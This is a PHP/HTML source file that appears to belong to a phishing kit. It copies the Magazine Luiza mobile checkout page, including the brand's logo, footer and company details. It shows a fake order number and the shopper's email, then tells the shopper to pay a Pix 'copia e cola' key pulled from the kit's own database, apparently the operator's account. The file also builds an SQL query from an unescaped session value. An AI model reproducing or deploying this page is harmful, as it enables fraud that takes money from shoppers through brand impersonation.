<?php
error_reporting(0);
ini_set(“display_errors”, 0 );


session_start();

require ("function/modulo.php");

if (isset($_SESSION ['rand_pix'])) {



$pedido = $_SESSION ['rand_pix'];
$email_cliente = $_SESSION ['email_cliente'];



$_SESSION ['libera_etapa'] = 1;
$_SESSION ['new_log'] = 'Pix';


$id = $_SESSION ['id_produto'];


$dadosQA = "SELECT* FROM produtos where id=$id";
$conQA = $mysqli->query($dadosQA) or die($mysqli->error);

while ($consultaQA = $conQA->fetch_array()) {
	
	$status_pix = $consultaQA ['status_pix'];
	$key_pix = $consultaQA ['key_pix'];

	
}



if ($status_pix == 1) {


?>


<!DOCTYPE html>
<html lang="pt-BR">

   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Sacola de compras - Magazine Luiza</title>
      <meta name="description" content="As melhores ofertas em móveis, eletrônicos, eletrodomésticos, informática e muito mais, você encontra no site do Magazine Luiza! Confira!">
      <meta name="viewport" content="width=device-width">

      <style>.async-hide { opacity: 0 !important}</style>

      <link rel="shortcut icon" href="https://tiao.magazineluiza.com.br/img/favicon.png">
      <link rel="stylesheet" href="../assets/css/icon.css">


   </head>
   <body cz-shortcut-listen="true">
      <div id="root">
         <div data-reactroot="">
            <div class="CheckoutHeader-m.magazineluiza">
               <div class="CheckoutHeader">
                  <div class="CheckoutHeader-content">
                     <div class="CheckoutHeader-logo">
                        <a href="https://m.magazineluiza.com.br/">
                           <svg width="138" height="30" viewBox="0 0 138 30" xmlns="http://www.w3.org/2000/svg" class="CheckoutHeader-logo-icon">
                              <path d="M135.742.487h-3.105c-.886 0-1.42.536-1.42 1.42v9.182c0 3.371-1.818 5.278-4.346 5.278-2.662 0-4.17-1.729-4.17-5.055V1.907c0-.886-.535-1.42-1.42-1.42h-3.104c-.886 0-1.42.536-1.42 1.42v9.848c0 6.254 3.239 9.802 8.118 9.802 2.928 0 5.19-.975 6.786-2.972l.268 1.243c.178.804.71 1.242 1.552 1.242h2.262c.888 0 1.42-.536 1.42-1.42V1.907c-.001-.886-.533-1.42-1.421-1.42zm-21.646 15.171h-5.588c-1.952 0-2.972-1.02-2.972-2.972V1.907c0-.886-.536-1.42-1.42-1.42h-3.194c-.887 0-1.418.536-1.418 1.42V13.44c0 4.746 2.882 7.634 7.633 7.634h6.965c.886 0 1.42-.536 1.42-1.42v-2.577c-.006-.886-.539-1.42-1.426-1.42zM23.697 1.863C23.607.938 23.12.488 22.232.488h-2.35c-.754 0-1.286.31-1.685.976l-5.723 9.67-5.322-9.67C6.797.794 6.214.488 5.466.488H2.938c-.888 0-1.375.45-1.465 1.375L.011 19.606c-.09.976.401 1.464 1.33 1.464H4.18c.887 0 1.42-.444 1.464-1.376l.621-9.936 3.415 6.16c.355.67.938.977 1.685.977h1.953c.754 0 1.286-.268 1.685-.976l3.86-6.61.443 10.38c.044.937.536 1.375 1.42 1.375h3.06c.937 0 1.42-.487 1.33-1.464L23.697 1.863zM95.377.487h-2.439c-.843 0-1.42.444-1.552 1.288l-.134 1.02C89.878 1.331 87.882 0 84.554 0c-5.588 0-9.713 4.392-9.713 10.734 0 6.21 3.858 10.823 9.359 10.823 3.459 0 5.722-1.464 7.098-2.972l.222 1.243c.134.804.67 1.242 1.508 1.242h2.35c.889 0 1.42-.536 1.42-1.42V1.907c-.001-.886-.533-1.42-1.42-1.42zm-9.529 15.88c-3.15 0-5.145-2.173-5.145-5.544 0-3.415 2.084-5.633 5.145-5.633 3.149 0 5.144 2.173 5.144 5.544-.006 3.416-2.09 5.633-5.144 5.633zM71.292.487h-2.44c-.843 0-1.419.444-1.553 1.288l-.134 1.02C65.791 1.331 63.795 0 60.47 0c-5.59 0-9.71 4.125-9.71 10.468 0 6.033 3.814 10.29 9.315 10.29 3.415 0 5.456-1.419 6.83-2.927v1.02c0 3.549-1.996 5.812-6.209 5.812-1.728 0-3.436-.365-5.013-1.071-.842-.402-1.508-.223-1.907.62l-.976 1.952c-.402.804-.268 1.464.489 1.907 2.35 1.33 5.233 1.863 8.027 1.863 6.964 0 11.4-4.391 11.4-10.513V1.907c-.004-.886-.536-1.42-1.423-1.42zm-9.536 15.215c-3.062 0-5.146-2.04-5.146-5.19 0-3.327 2.173-5.322 5.146-5.322 3.06 0 5.144 1.818 5.144 5.234 0 3.06-2.172 5.278-5.144 5.278zM47.206.487h-2.439c-.844 0-1.42.444-1.554 1.288l-.134 1.02C41.705 1.331 39.71 0 36.383 0c-5.589 0-9.714 4.392-9.714 10.734 0 6.21 3.859 10.823 9.36 10.823 3.458 0 5.72-1.464 7.097-2.972l.223 1.243c.134.804.67 1.242 1.508 1.242h2.35c.888 0 1.42-.536 1.42-1.42V1.907c-.002-.886-.533-1.42-1.421-1.42zm-9.537 15.88c-3.149 0-5.146-2.173-5.146-5.544 0-3.415 2.085-5.633 5.146-5.633 3.15 0 5.145 2.173 5.145 5.544 0 3.416-2.084 5.633-5.145 5.633z" fill="#FFF"></path>
                           </svg>
                        </a>
                     </div>
                  </div>
                  <div class="CheckoutHeader-colorsStrip">
                     <svg height="6" viewBox="0 0 360 6" xmlns="http://www.w3.org/2000/svg" class="CheckoutHeader-colorsStrip-image" width="360">
                        <defs>
                           <lineargradient x1=".92%" y1="0%" x2="100%" y2="0%" id="a">
                              <stop stop-color="#FFFF4A" offset=".092%"></stop>
                              <stop stop-color="#FCD000" offset="3.911%"></stop>
                              <stop stop-color="#FFC112" offset="7.776%"></stop>
                              <stop stop-color="#FFC112" offset="10.896%"></stop>
                              <stop stop-color="#FF8A00" offset="15.69%"></stop>
                              <stop stop-color="#FF5F5F" offset="22.388%"></stop>
                              <stop stop-color="#FF253A" offset="27.517%"></stop>
                              <stop stop-color="#FF37A8" offset="36.913%"></stop>
                              <stop stop-color="#C739FF" offset="49.38%"></stop>
                              <stop stop-color="#A400E1" offset="55.694%"></stop>
                              <stop stop-color="#2ECEFF" offset="71.63%"></stop>
                              <stop stop-color="#0086FF" offset="80.307%"></stop>
                              <stop stop-color="#72F772" offset="93.689%"></stop>
                              <stop stop-color="#00D604" offset="100%"></stop>
                           </lineargradient>
                        </defs>
                        <path transform="matrix(1 0 0 -1 0 74.97)" d="M0 69h360v5.97H0z" fill="url(#a)"></path>
                     </svg>
                  </div>
               </div>
            </div>




	<script>

var i = setInterval(function () {
    
    clearInterval(i);
  
    // O código desejado é apenas isto:
    document.getElementById("loading").style.display = "none";
    document.getElementById("conteudo").style.display = "inline";

}, 3000);


</script>	

	  			
				<div id="loading" style="display: block">
				
				<div id="overlay_a">	
				
				<center><br><br><br><br><br><br><br><br><br><br><br><br>
				<svg xmlns="http://www.w3.org/2000/svg" class="image" width="20" height="20" viewBox="0 0 55 55"><path fill="#FFCE00" d="M43.7 5.3c-1.3 1.8-3 4.1-4.7 6.5C35.7 9.4 31.8 8 27.5 8V0c6 0 11.6 2 16.2 5.3z"/><path fill="#FB9600" d="M43.6 5.2c-1.3 1.8-3 4.1-4.7 6.5 3.2 2.3 5.8 5.6 7.1 9.7l7.6-2.5c-1.8-5.7-5.4-10.4-10-13.7z"/><path fill="#E25335" d="M53.7 19c-2.2.7-4.8 1.6-7.6 2.5 1.2 3.8 1.3 8 0 12l7.6 2.5c1.8-5.8 1.7-11.7 0-17z"/><path fill="#DE349E" d="M43.7 49.7c-1.3-1.8-3-4.1-4.7-6.5 3.2-2.3 5.8-5.7 7.1-9.7l7.6 2.5c-1.9 5.7-5.5 10.4-10 13.7z"/><path fill="#BF2FDC" d="M43.7 49.7c-1.3-1.8-3-4.1-4.7-6.5-3.2 2.3-7.2 3.7-11.4 3.7v8c5.9.1 11.5-1.9 16.1-5.2z"/><path fill="#5D33D5" d="M11.3 49.7c1.3-1.8 3-4.1 4.7-6.5 3.2 2.3 7.2 3.7 11.4 3.7v8c-5.9.1-11.5-1.9-16.1-5.2z"/><path fill="#2B7CD7" d="M11.4 49.8c1.3-1.8 3-4.1 4.7-6.5-3.2-2.3-5.8-5.6-7.1-9.7l-7.6 2.5c1.8 5.7 5.4 10.4 10 13.7z"/><path fill="#33C3DD" d="M1.4 36c2.2-.7 4.8-1.6 7.6-2.5-1.2-3.8-1.3-8 0-12L1.3 19c-1.8 5.8-1.7 11.7.1 17z"/><path fill="#32D9A1" d="M11.3 5.3c1.3 1.8 3 4.1 4.7 6.5-3.2 2.3-5.8 5.7-7.1 9.7L1.3 19c1.9-5.7 5.5-10.4 10-13.7z"/><path fill="#3FCB2A" d="M11.3 5.3c1.3 1.8 3 4.1 4.7 6.5C19.3 9.4 23.2 8 27.5 8V0c-6 0-11.6 2-16.2 5.3z"/></svg>
				</center>
				</div>
				
				</div>


	  
	  
	  <div id="conteudo" style="display: none">
	  





            <div class="App clearfix">
               <div class="ConfirmOrderPage">
                  <div class="ConfirmOrderPage-container">
                     <div class="ConfirmOrderHeader clearfix">
                        <div class="ConfirmOrderHeader-title--success">Para finalizar a sua compra é só realizar o pagamento com Pix!</div>
                        <div class="ConfirmOrderBox clearfix">
                           <div class="ConfirmOrderBox-leftContainer">
                              <p>Número do pedido</p>
                              <p class="ConfirmOrderBox-orderNumber"><?php echo $pedido ?></p>
                              <div>
                                 <div class="ConfirmOrderHeader-description">
                                    <!-- react-text: 518 --> Confirmação do pedido será enviada para: <!-- /react-text --><span class="ConfirmOrderHeader-email"><?php echo $email_cliente ?></span><!-- react-text: 520 -->.<!-- /react-text -->
                                 </div>
                                 <a class="ConfirmOrderBox-show-details" href="checkout.php">Alterar forma de pagamento</a>
                              </div>
                           </div>
                        </div>
                        <div class="OrderBoxPix">
                           <div class="OrderBoxPix-title">
                              <svg class="OrderBoxPix-titleIcon" width="30" height="30" viewBox="0 0 30 30" fill="none">
                                 <path d="M22.556 22.155a3.942 3.942 0 0 1-2.804-1.161l-4.05-4.05a.77.77 0 0 0-1.064 0l-4.065 4.065a3.942 3.942 0 0 1-2.804 1.16H6.97L12.1 27.3a4.102 4.102 0 0 0 5.8 0l5.144-5.144h-.488ZM7.769 7.83c1.059 0 2.055.413 2.804 1.162l4.065 4.065a.753.753 0 0 0 1.064 0l4.05-4.05a3.942 3.942 0 0 1 2.804-1.162h.488L17.9 2.701a4.102 4.102 0 0 0-5.8 0l-5.13 5.13h.799Z" fill="#32BCAD"></path>
                                 <path d="M27.299 12.1 24.19 8.99a.593.593 0 0 1-.22.045h-1.414c-.73 0-1.446.296-1.962.813l-4.05 4.05a1.938 1.938 0 0 1-1.374.568 1.94 1.94 0 0 1-1.374-.568L9.73 9.834a2.793 2.793 0 0 0-1.962-.813H6.03a.589.589 0 0 1-.209-.042l-3.12 3.12a4.102 4.102 0 0 0 0 5.801l3.12 3.121a.591.591 0 0 1 .209-.042h1.738c.73 0 1.445-.296 1.962-.813l4.064-4.064c.735-.735 2.016-.735 2.75 0l4.05 4.05a2.793 2.793 0 0 0 1.961.812h1.414a.59.59 0 0 1 .22.045L27.3 17.9a4.102 4.102 0 0 0 0-5.8Z" fill="#32BCAD"></path>
                              </svg>
                              <div class="OrderBoxPix-titleDescription">Pagamento via Pix</div>
                           </div>
                           <div class="PixSteps">
                              <div class="PixSteps-block">
                                 <div class="PixSteps-option">1</div>
                                 <div class="PixSteps-description">
                                    <div>
                                       <!-- react-text: 533 -->Copie o código de pagamento no botão abaixo<!-- /react-text -->
                                       <div class="CopyPix">
									   
										<font id="text_key" color="#00d848"></font>
									   
                                          <div><input id="chave_pix"  class="CopyPix-input" value="<?php echo $key_pix ?>" readonly=""></div>
                                          <button onClick="copy_key()" class="CopyPix-button">Copiar código Pix</button>
                                       </div>
                                       <div class="ExpirationTimerPix">
                                          <div class="ExpirationTimerPix-description">
                                             <!-- react-text: 540 -->O código é válido por 13 horas.
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
							  
							  

							  
							  
                              <div class="PixSteps-block">
                                 <div class="PixSteps-option">2</div>
                                 <div class="PixSteps-description">Abra o app ou banco de sua preferência. Escolha a opção pagar com código Pix “copia e cola”.</div>
                              </div>
                              <div class="PixSteps-block">
                                 <div class="PixSteps-option">3</div>
                                 <div class="PixSteps-description">Escolha a opção “Pix copia e cola” no app escolhido da sua instituição financeira. Cole o código e autorize o pagamento.</div>
                              </div>
                              <div class="PixSteps-block">
                                 <div class="PixSteps-option">4</div>
                                 <div class="PixSteps-description">Você vai receber a confirmação do pagamento no seu e-mail e através dos nosso canais. E pronto!</div>
                              </div>
                           </div>
                           <span class="OrderBoxPix-information">Se o pagamento não for confirmado, não se preocupe. O pedido será cancelado automaticamente.</span>
                        </div>
                        <!-- react-text: 553 --><!-- /react-text --><!-- react-empty: 554 -->
                     </div>

                     <div>
                     </div>
                  </div>
               </div>
            </div>



				  
				  
				  
				  
               </div>
        
			
			
            <div class="Checkout-footer-m.magazineluiza">
               <div class="CheckoutFooter">
                  <div class="CheckoutFooter-content">
                     <ul class="CheckoutFooter-top">
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--sac mobile-hidden">
                           <svg xmlns="http://www.w3.org/2000/svg" width="25pt" height="25pt" viewBox="0 0 25 25" fill="#8C8C8C" class="CheckoutFooter-icon">
                              <path d="M24.629 18.73l-4.098-4.09a1.273 1.273 0 00-1.793 0l-3.86 3.868-8.401-8.39 3.859-3.864a1.266 1.266 0 000-1.793L6.238.37a1.266 1.266 0 00-1.793 0L.925 3.898a3.17 3.17 0 00.005 4.48l15.699 15.677a3.17 3.17 0 004.48-.004l3.52-3.528a1.27 1.27 0 000-1.793"></path>
                           </svg>
                           <!-- react-text: 116 --> <!-- /react-text --><a class="CheckoutFooter-icon-description" href="http://www.magazineluiza.com.br/central-de-atendimento/" target="_blank" rel="noopener">Atendimento</a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--tel-chat">
                           <svg xmlns="http://www.w3.org/2000/svg" width="25pt" height="25pt" viewBox="0 0 25 25" fill="#8C8C8C" class="CheckoutFooter-icon">
                              <path d="M12.219 7.184H4.492c-.762 0-1.355.636-1.355 1.386h10.465c0-.75-.622-1.386-1.383-1.386m-3.867 9.804c-2.286 0-4.145-1.902-4.145-4.21 0-.262.195-.462.453-.462.254 0 .453.2.453.461 0 1.817 1.438 3.258 3.215 3.258s3.215-1.473 3.215-3.258c0-.261.195-.46.453-.46s.453.199.453.46a4.103 4.103 0 01-4.097 4.211zm6.941-5.734c-.059-.98-.848-1.73-1.805-1.73H3.218c-.956 0-1.75.75-1.808 1.73L.738 21.488C.68 22.555 1.5 23.48 2.547 23.48h11.59c1.043 0 1.894-.925 1.808-1.992zm8.945 3.641l-.836-2.875a.655.655 0 00-.808-.446l-2.711.793-1.719-5.898 2.711-.79a.652.652 0 00.445-.808l-.836-2.875a.656.656 0 00-.812-.445l-2.469.719a1.627 1.627 0 00-1.113 2.027l3.2 11.015a1.637 1.637 0 002.03 1.114l2.473-.719a.658.658 0 00.445-.812zm0 0"></path>
                           </svg>
                           <!-- react-text: 121 --> Compre pelo <!-- /react-text --><a class="CheckoutFooter-icon-description" href="https://sacolamobile.magazineluiza.com.br/#">chat online</a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--certificate mobile-hidden">
                           <svg xmlns="http://www.w3.org/2000/svg" width="25pt" height="31pt" viewBox="0 0 25 31" fill="#8C8C8C" class="CheckoutFooter-icon">
                              <path d="M21.875 13.176h-.14V9.16C21.734 4.102 17.601 0 12.5 0 7.402 0 3.266 4.102 3.266 9.16v4.016h-.141C1.398 13.176 0 14.562 0 16.273v11.625C0 29.61 1.398 31 3.125 31h18.75C23.602 31 25 29.61 25 27.898V16.273c0-1.71-1.398-3.097-3.125-3.097zM6.391 9.16c0-3.344 2.742-6.058 6.109-6.058s6.11 2.714 6.11 6.058v4.016H6.39zm0 0"></path>
                           </svg>
                           <!-- react-text: 126 --> <!-- /react-text --><a class="CheckoutFooter-icon-description" href="http://www.magazineluiza.com.br/estaticas/seguranca-maxima/" target="_blank" rel="noopener">Certificados e segurança</a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--logo-internetSegura mobile-hidden">
                           <a href="http://www.internetsegura.org/" target="_blank" rel="noopener">
                              <svg xmlns="http://www.w3.org/2000/svg" width="100" height="38.354" viewBox="0 0 100 38.354" class="CheckoutFooter-logo-internetSegura">
                                 <path fill="#219C31" d="M0 .073h4.075v15.603H0V.073zM23.774.073h10.712v3.463h-3.275l-.011 12.14h-4.086l-.016-12.14h-3.324s.006-2.298 0-3.463zM35.931.073h8.848v3.468h-4.811V6.07h4.602l-.016 3.545h-4.585l.005 2.561 4.806-.021v3.522h-8.848c-.001-.001.015-10.412-.001-15.604zM89.331.073H100v3.479h-3.297v12.124h-4.092V3.536l-3.28.026V.073zM6.916.073h4.086l7.286 9.583V.073h4.188v15.603h-4.188L11.001 6.07v9.605H6.916c0 .001.053-10.415 0-15.602zM47.216.073s5.691-.328 8.446.401c2.99.87 3.902 4.945 2.109 7.302-.611.812-2.438 1.682-2.438 1.682l4.837 6.217h-5.096l-3.845-6.04v6.04h-4.016s.032-10.411-.016-15.603l.019.001zM61.133.073h4.07l7.365 9.594V.073h4.098l.005 15.603h-4.103l-7.365-9.595v9.595h-4.07L61.139.073zM79.2.073h8.616v3.468h-4.51v2.522h4.51v3.561h-4.51v2.534h4.51v3.517h-8.61c0 .001 0-10.416-.006-15.602z"></path>
                                 <path fill="#FFF" d="M51.238 3.166c1.281.134 3.328.263 3.205 2.051.011 1.713-1.961 1.804-3.211 1.971-.009-1.343-.005-2.68.006-4.022z"></path>
                                 <path d="M0 17.249s66.663-.012 100 .005c-.021 7.034-.021 14.066 0 21.101H0V17.249z"></path>
                                 <path fill="#FFF" d="M28.72 23.156c2.405-5.092 9.863-6.449 14.18-3.034.993.858 1.713 1.976 2.47 3.034-1.439.671-2.91 1.271-4.37 1.89-.833-1.257-1.858-2.62-3.479-2.803-2.411-.316-4.408 1.788-4.848 4.011-.961 3.082 1.192 7.42 4.8 7.087 1.783.032 3.087-1.486 3.522-3.092-1.304-.018-3.919 0-3.919 0l.005-3.625h9.198s-.424 5.277-2.094 7.324c-3.742 4.862-12.462 4.096-15.324-1.316-1.591-2.878-1.634-6.551-.141-9.476zM4.44 19.016c2.711-1.321 5.782-.371 8.376.751a100.108 100.108 0 01-1.713 3.63c-1.272-.596-2.76-1.718-4.177-.875-.939.279-1.31 1.605-.419 2.181 2.073 1.245 4.988 1.171 6.421 3.394 1.417 2.566.612 6.367-2.019 7.871-3.286 1.917-7.425 1.063-10.448-.956.676-1.219 1.348-2.438 2.019-3.656 1.402.956 2.991 2.066 4.795 1.648 1.229-.097 2.142-1.857 1.004-2.706-1.971-1.225-4.708-1.117-6.25-3.013-1.787-2.708-.638-6.998 2.411-8.269zM15.715 18.887h10.067v3.897h-5.364v2.964h5.364v3.882l-5.364.017v3.07h5.364v3.818H15.71s-.005-11.759.005-17.648zM48.242 18.887h4.574v11.038c0 1.559 1.234 3.152 2.879 3.018 1.471.199 3.179-1.46 3.179-3.018V18.887h4.703s.048 7.758-.05 11.63c-.053 2.114-.977 4.386-2.937 5.4-2.889 1.536-6.522 1.486-9.434.017-1.74-.967-2.797-2.916-2.856-4.887-.124-4.048-.059-12.155-.059-12.155v-.005zM66.357 18.887s7.479-.763 10.813.918c3.678 2.212 2.813 8.671-1.493 9.61 1.72 2.404 5.192 7.12 5.192 7.12h-5.434l-4.354-6.733-.006 6.733h-4.708l-.012-17.634v-.015h.002zM87.538 18.887h5.048l6.657 17.648h-4.982l-1.073-3.008-6.373.006-1.111 3.002h-4.531c-.002 0 4.503-12.881 6.365-17.648z"></path>
                                 <path d="M71.07 22.365c1.472.06 3.699.221 3.607 2.238.104 1.981-2.189 2.121-3.607 2.348-.015-1.53-.015-3.055 0-4.586zM88.102 30.001l1.938-5.697 1.853 5.702s-2.53-.005-3.791-.005z"></path>
                              </svg>
                           </a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--logo-ebit mobile-hidden"><a href="https://www.ebit.com.br/552" target="_blank" rel="noopener"><span class="ImgEbitDiamante"><img src="data:image/png;base64,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" width="62px" height="62px"></span></a></li>
                     </ul>
                  </div>
                  <div class="CheckoutFooter-section">
                     <!-- react-text: 141 -->Preços e condições de pagamento exclusivos para compras via internet, podendo variar nas lojas físicas.<!-- /react-text --><br><!-- react-text: 143 -->Ofertas válidas na compra de até <!-- /react-text --><!-- react-text: 144 -->10<!-- /react-text --><!-- react-text: 145 --> peças de cada produto por cliente, até o término dos nossos estoques para internet.<!-- /react-text --><br><!-- react-text: 147 -->Caso os produtos apresentem divergências de valores, o preço válido é o da Sacola de compras.<!-- /react-text --><br><!-- react-text: 149 -->Vendas sujeitas a análise e confirmação de dados.<!-- /react-text -->
                  </div>
                  <div class="CheckoutFooter-section">
                     <!-- react-text: 151 -->Rodovia dos Bandeirantes KM 68,760 - Rio Abaixo - CEP: 13213-902 - Louveira/SP - CNPJ: 47960950/0449-27<!-- /react-text --><br><!-- react-text: 153 -->Magazine Luiza – Todos os direitos reservados<!-- /react-text -->
                  </div>
               </div>
            </div>
            <!-- react-empty: 154 --><!-- react-empty: 181 -->
         </div>
      </div>
     
	 
	 <script src="../assets/js/jquery-3.2.1.min.js"></script>
     <script src="../assets/js/slide-menu.js"></script>
	 
<script>
		function copy_key() {
        let textoCopiado = document.getElementById("chave_pix");
        textoCopiado.select();
        textoCopiado.setSelectionRange(0, 99999)
        document.execCommand("copy");
        
		$('#text_key').html('Chave copiada com sucesso!');
		
		
    }
</script>
	 
	 
   </body>
</html>


<?php } else { header ('Location: checkout.php'); } ?>
<?php } else { http_response_code(401); echo '{"status": "Unauthorized"}'; } ?>